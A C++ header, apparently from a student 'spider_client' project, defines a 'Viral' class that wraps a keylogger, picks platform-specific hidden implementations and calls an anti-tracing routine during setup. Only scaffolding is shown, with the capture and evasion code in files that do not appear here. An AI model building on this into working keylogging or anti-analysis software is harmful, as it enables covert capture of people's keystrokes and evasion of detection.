/*
** Viral.hpp for spider_client
**
** Made by King
** Login   <arthur.cros@epitech.net>
**
** Started on  Fri Sep 29 17:46:11 2017 King
**
*/

#ifndef SPIDER_CLIENT_VIRAL_HPP
#define SPIDER_CLIENT_VIRAL_HPP

#include <KeyLogger/KeyLogger.hpp>
#include "Configuration.hpp"

#if defined(USING_LINUX)
#include <Viral/details/LinuxViral.hpp>
#elif defined(USING_OSX)
#include <Viral/details/OSXViral.hpp>
#elif defined(USING_WINDOWS)
#include <Viral/details/WindowsViral.hpp>
#else
#error Unsupported platform
#endif

namespace spi
{
    class Viral : details::ViralImpl
    {
    public:
        Viral() = default;

        virtual ~Viral() noexcept
        {
            _log(logging::Info) << " shutting down." << std::endl;
        }

        void hide() const noexcept
        {
            _keylogger->stop();
        }

        void show() const noexcept
        {
            _keylogger->run();
        }

        void setup(KeyLogger *keylogger) noexcept
        {
            antiTrace();
            _keylogger = keylogger;
            _log(logging::Info) << " Successfully initialized" << std::endl;
        }

    private:
        logging::Logger _log{"spider-viral", logging::Level::Debug};
        KeyLogger *_keylogger{nullptr};
    };
}
#endif //SPIDER_CLIENT_VIRAL_HPP
